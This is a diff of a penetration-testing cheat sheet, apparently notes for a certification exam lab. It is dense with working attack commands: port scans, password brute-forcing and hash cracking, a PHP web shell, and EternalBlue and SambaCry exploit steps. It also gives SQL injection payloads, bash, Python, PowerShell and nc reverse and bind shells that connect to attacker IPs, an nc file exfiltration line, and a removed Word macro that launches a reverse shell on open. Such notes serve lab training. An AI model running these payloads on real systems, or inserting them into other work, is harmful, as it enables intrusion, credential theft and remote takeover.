@@ -9,28 +9,33 @@
 * [Covering Tracks](#covering-tracks)
 
 ### Reconnaissance
+The purpose of the Reconnaissance phase is to observe and collect information about the network without adding any additional traffic to it. For your report, summarize what you find in a table similar to the one below. 
 | Network ID | Subnet Mask | Default Gateway | Computers |
 | ---------- | ----------- | --------------- | ---------------- |
 | 10.11.12.0 | 255.255.255.0 | 10.11.12.254 | 5 |
 
 ### Enumeration
+The purpose of the Enumeration phase is to narrow-down the number of possible attack vectors by querying computers within scope and collecting additional information. For your report, summarize open ports, running services, and Operating Systems (OS) in use in a table similar to the one below. 
 | IP Address | Ports | Services | OS |
 | ---------- | ----- | -------- | --- |
-| 10.11.12.13 | 445 | SMB | Windows 10 | 
-| 10.11.12.23 | 25 | SMTP | Debian Linux | 
-| 10.11.12.25 | 2049 | NFS | FreeBSD | 
-| 10.11.12.69 | 22 | SSH | Fedora Linux | 
-| 10.11.12.123 | 80 | HTTP | Windows Server 2012 R2 | 
+| 10.11.12.13 | 445 | SMB | Windows 10 |
+| 10.11.12.23 | 25 | SMTP | Debian Linux |
+| 10.11.12.25 | 2049 | NFS | FreeBSD |
+| 10.11.12.69 | 22 | SSH | Fedora Linux |
+| 10.11.12.123 | 80 | HTTP | Windows Server 2012 R2 |
 
 #### Ports
+Declare a variable using the IP address of the target. 
 ```bash
 TARGET=10.11.12.13
 ```
 
+Scan the 1,000 most common ports. 
 ```bash
 sudo nmap $TARGET -sS -sU -oN scans/$TARGET-nmap-initial
 ```
 
+Scan all ports. 
 ```bash
 sudo nmap $TARGET -sS -sU -p- -oN scans/$TARGET-nmap-complete
 ```
@@ -60,7 +65,7 @@ sudo nmap $TARGET -O -oN scans/$NAME-nmap-os
 ```
 
 #### FTP
-I recommend creating and changing directories to a folder called "loot." It's important to stay organized (and you never know when there's something to download). 
+I recommend creating and changing directories to a folder called "loot." It's important to stay organized (and you never know when there's something to download).
 ```bash
 mkdir loot
 cd loot
@@ -81,14 +86,14 @@ List files.
 ls
 ```
 
-List files (using Curl). 
+List files (using Curl).
 ```bash
 curl ftp://anonymous:anonymous@$TARGET:21
 ```
 
-Change to Binary mode (an important setting if you're uploading/downloading binary files like pictures and/or executables!). 
+Change to Binary mode (an important setting if you're uploading/downloading binary files like pictures and/or executables!).
 ```bash
-binary 
+binary
 ```
 
 Download a file.
@@ -147,7 +152,7 @@ sudo nmap $TARGET -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-v
 
 #### HTTP
 ```bash
-dirb http://$TARGET 
+dirb http://$TARGET
 dirb http://$TARGET:$PORT/ -o scans/$TARGET-dirb-$PORT-common
 dirb http://$TARGET:80 /usr/share/wordlists/dirb/big.txt -z10 -o scans/$NAME-dirb-big-80
 ```
@@ -174,7 +179,7 @@ c – Remote Source Inclusion
 x – Reverse Tuning Options (i.e., include all except specified)
 ```
 
-Scan for misconfigurations. 
+Scan for misconfigurations.
 ```bash
 nikto -h $TARGET -T 2 -Format txt -o scans/$TARGET-nikto-80-misconfig
 ```
@@ -189,7 +194,7 @@ Check if the target is vulnerable to Shellshock
 sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$TARGET-nmap-scripts-80-http-shellshock
 ```
 
-#### POP3 
+#### POP3
 ```bash
 telnet $TARGET 110
 USER root
@@ -255,8 +260,8 @@ rsync -av rsync://$TARGET/$SHARE loot
 
 #### NFS
 ```bash
-sudo nmap $TARGET -p111 --script-nfs* 
-showmount -e $TARGET 
+sudo nmap $TARGET -p111 --script-nfs*
+showmount -e $TARGET
 
 sudo mkdir /mnt/FOO
 sudo mount //$TARGET:/$SHARE /mnt/FOO
@@ -309,7 +314,7 @@ Default Credentials
 # admin:adminadmin
 ```
 
-Hydra
+#### Hydra
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t4 ssh
 ```
@@ -318,7 +323,7 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t4 ssh
 hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"
 ```
 
-Patator
+#### Patator
 ```bash
 patator ftp_login host=$TARGET user=$USER password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
 ```
@@ -327,28 +332,28 @@ patator ftp_login host=$TARGET user=$USER password=FILE0 0=/usr/share/wordlists/
 patator http_fuzz url=http://$TARGET/$LOGIN method=POST body='username=FILE0&password=FILE1' 0=usernames.txt 1=/usr/share/wordlists/rockyout.txt -x ignore:fgrep=Unauthorized
 ```
 
-Crowbar
+#### Crowbar
 ```bash
 sudo apt install crowbar # version 0.4.1
 iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt > ./rockyou-UTF8.txt
 crowbar -b rdp -s $TARGET/32 -u administrator -C rockyou-UTF8.txt -n 1
 ```
 
-John the Ripper
+#### John the Ripper
 ```bash
-unshadow demo-passwd demo-shadow > demo-unshadow
-john demo-unshadow --wordlist=/usr/share/wordlists/rockyou.txt
+unshadow passwd.txt shadow.txt > unshadow.txt
+john unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
+Password-protected RAR files. 
 ```bash
-# cracking a RAR file
 rar2john backup.rar > hash.txt
 john --format=rar hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-Hashcat
+#### Hashcat
 ```hash
-# modes 
+# modes
 # - SHA256: 1400
 # - SHA512: 1800
 # - RAR5: 13000
@@ -358,7 +363,7 @@ Hashcat
 ```
 
 ```bash
-hashcat -m 1400 -a 0 /path/to/hashes.txt /usr/share/wordlists/rockyou.txt 
+hashcat -m 1400 -a 0 /path/to/hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ```bash
@@ -369,12 +374,13 @@ hashcat -m 13000 -a 0 rar.hash /usr/share/wordlists/rockyou.txt
 #### Local File Inclusions
 Find a way to upload a PHP command shell
 ```bash
-echo "<?php echo shell_exec($_GET['cmd']); ?>" > shell.php 
+echo "<?php echo shell_exec($_GET['cmd']); ?>" > shell.php
 ```
 
+#### Exploits
 MS09_050: SMBv2 Command Value Vulnerability  
 CVE-2009-3103  
-This vulnerability impacts Windows Server 2008 SP1 32-bit as well as Windows Vista SP1/SP2 and Windows 7. 
+This vulnerability impacts Windows Server 2008 SP1 32-bit as well as Windows Vista SP1/SP2 and Windows 7.
 ```bash
 nmap $TARGET -p445 --script smb-vuln-cve2009-3103
 wget https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py
@@ -382,7 +388,7 @@ wget https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py
 
 EternalBlue  
 CVE-2017-0144  
-This vulnerability impacts ???. Exploiting it requires access to a Named Pipe (NOTE: Windows Vista and newer does not allow anonymous access to Named Pipes). 
+This vulnerability impacts ???. Exploiting it requires access to a Named Pipe (NOTE: Windows Vista and newer does not allow anonymous access to Named Pipes).
 ```bash
 git clone https://github.com/worawit/MS17-010
 cd MS17-010
@@ -393,7 +399,7 @@ python zzz_exploit.py $TARGET $NAMED_PIPE
 
 SambaCry  
 CVE-2017-7494  
-Exploiting this vulnerability depends on your ability to write to a share. Download Proof-of-Concept code from joxeankoret and modify as desired. 
+Exploiting this vulnerability depends on your ability to write to a share. Download Proof-of-Concept code from joxeankoret and modify as desired.
 ```bash
 mkdir exploits
 cd exploits
@@ -403,7 +409,7 @@ mv implant.c implant.bak
 vim implant.c
 ```
 
-An example of a modified implant.c file. This source file gets compiled by the provided Python script. 
+An example of a modified implant.c file. This source file gets compiled by the provided Python script.
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -418,10 +424,10 @@ system("ping -c2 $LHOST");
 
 My example payload sends two ICMP packets to my computer. Therefore, the command sentence below is necessary to confirm the exploit works. If you chose to include a reverse shell, you would run something like `sudo nc -nvlp 443` instead.
 ```bash
-sudo tcpdump -i tun0 icmp 
+sudo tcpdump -i tun0 icmp
 ```
 
-Run the exploit. 
+Run the exploit.
 ```bash
 python cve_2017_7494.py -t $RHOST --rhost $LHOST --rport $LPORT
 ```
@@ -461,7 +467,7 @@ logon "=`$EXPLOIT`"
 cmd.php?cmd=powershell.exe -c "c:\xampp\htdocs\nc.exe 192.168.49.58 45443 -e 'cmd.exe'"
 ```
 
-If you get the error below, change the LPORT variable of your exploit. For example, try using a port you discovered was open during the reconnaissance phase. 
+If you get the error below, change the LPORT variable of your exploit. For example, try using a port you discovered was open during the reconnaissance phase.
 ```
 /*
 Warning: fread() expects parameter 1 to be resource, bool given in C:\xampp\htdocs\rshell.php on line 74
@@ -471,23 +477,23 @@ Warning: fclose() expects parameter 1 to be resource, bool given in C:\xampp\htd
 
 To upgrade your shell to a fully-functional PTY on Windows, try using nc.exe instead of a Msfvenom reverse shell.
 
-#### SQL Injections
+#### SQL Injection
 Check for a SQLi vulnerability
 ```bash
-' 
+'
 ```
 
 Check the quality of SQLi vulnerability
 ```bash
-' or 1=1 -- 
+' or 1=1 --
 ```
 
 Get the number of columns of a table (increment the number until there is an error; ex: if 4 triggers an error, there are 3 columns).
 ```sql
-' ORDER BY 1 -- 
-' ORDER BY 2 -- 
-' ORDER BY 3 -- 
-' ORDER BY 4 -- 
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --
+' ORDER BY 4 --
 ```
 
 Get all table names (look for user/admin tables).
@@ -546,63 +552,17 @@ USE targetdb;
 SELECT * FROM usertbl;
 ```
 
-**Macros**  
-How to Add a Macro to a Microsoft Word Document
-1. Click-on "View" > "Macros" 
-2. Set "Macro name" to be "Reverse Shell"
-3. Set "Macros in" to be the name of the current Word document
-4. Click-on "Create"
-5. Replace the provided template code with your payload (see below for an example)
-6. Save the macro-embedded file as a "Word 97-2003 Document"
-
-**Example Macro**  
-To test the example code below, save it with a .doc or .docm file (do not use .docx). Ensure to use variables to store strings as VBA limits string lengths to no more than 255 per string. In other words, if you have a long payload, break it up and then concatenate each part to a variable. 
-```vba
-Sub AutoOpen()
-  ReverseShell
-End Sub
-
-Sub Document_Open()
-  RevereShell
-End Sub
-
-Sub ReverseShell()
-  ' copy/paste your payload into the FOO variable
-  Dim FOO As String
-  FOO = ""
-  
-  CreateObject("Wscript.shell").Run FOO
-End Sub
-```
-
-Example Macro Syntax Explained
-```bash
-# Sub = used like a function, does not return values (functions do)
-# AutoOpen() = predefined procedure; executed when a new doc is opened
-# Document_Open() = predefined procedure; exec when a doc is already opened
-# ' = comments
-# Dim = used to declare a var (example declares FOO as a string var)
-# CreateObject() = ???
-# End Sub = represents the end of "sub" procedure within our exploit
-```
-
-### VBScript, CScript, and WScript
-* 'cscript' runs entirely in the command line and is ideal for non-interactive scripts.
-* 'wscript' will popup Windows dialogue boxes for user interaction.
-
 ### Maintaining Access
-#### Reverse Shell
-```bash
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TARGET LPORT=$PORT -f elf -o rshell.elf
-```
-
-## Bind Shells
 #### Python Bind Shell
 ```python
 python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",443));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
 ```
 
-## Reverse Shells
+#### Python Reverse Shell
+```python
+export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
+
 #### Bash Reverse Shells
 ```bash
 /bin/bash -i >& /dev/tcp/10.0.0.1/443 0>&1
@@ -611,6 +571,7 @@ python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOC
 #### Msfvenom Reverse Shells
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rshell.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TARGET LPORT=$PORT -f elf -o rshell.elf
 msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp -o rshell.asp
 msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o rshell.php
 msfvenom -p windows/shell_reverse_tcp LHOST=$LPORT LPORT=$LPORT -f hta-psh -o rshell.hta
@@ -630,11 +591,6 @@ nc -nv 10.10.10.10 443 -e "/bin/bash"
 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.11.12.13",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 ```
 
-#### Python Reverse Shells
-```python
-export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-```
-
 #### JavaScript Reverse Shells
 ```javascript
 (function(){
@@ -651,14 +607,12 @@ export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pt
 })();
 ```
 
-## Upgrade to a PTY Shell
-#### Python PTY Shell
+#### Upgrade to a PTY Shell
 ```bash
 echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
 python /tmp/shell.py
 export TERM=xterm # be able to clear the screen, etc.
 ```
-
 
 #### Information to Gather for Privilege Escalation
 | Information | Benefit to Privilege Escalation |
@@ -674,7 +628,7 @@ export TERM=xterm # be able to clear the screen, etc.
 | Scheduled Tasks | Identify automated tasks running under an administrator-context; find file-paths to files with weak permissions. |
 | Programs and Patch Levels | Find matching exploits; HotFixId and InstalledOn represent quality of patch mgmt; qfe = quick fix engineering. |
 | Readable/Writable Files and Directories | Find credentials and/or files (that run under a privileged account) that can be modified/overwritten: look for files readable and/or writable by “Everyone,” groups you’re part of, etc. |
-| Unmounted Drives | Find credentials. | 
+| Unmounted Drives | Find credentials. |
 | Device Drivers and Kernel Modules | Find matching exploits. |
 | AutoElevate Settings and Binaries | Find settings and/or files that run as the file owner when invoked. If AlwaysInstallElevated is enabled, exploit via a malicious .msi file. |
 
@@ -736,29 +690,3 @@ nc.exe -w3 10.11.12.13 5050 < stealme.exe
 ```bash
 # techniques go here :)
 ```
-
-## References
-Local File Inclusions
-- https://www.techsec.me/2020/09/local-file-inclusion-to-rce.html
-- https://packetstormsecurity.com/files/89823/vtiger-CRM-5.2.0-Shell-Upload.html
-
-SQL Injection
-- http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
-- https://pentesterlab.com/exercises/from_sqli_to_shell/course
-- https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#StackingQueries
-- https://www.w3schools.com/tags/ref_urlencode.ASP
-
-Windows
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#user-enumeration
-
-Exam Tips
-- https://markeldo.com/how-to-pass-the-oscp/
-- https://fareedfauzi.gitbook.io/oscp-notes/
-- https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md
-- https://guide.offsecnewbie.com/
-
-Tools
-- https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
-
-Walkthroughs
-- https://www.trenchesofit.com/
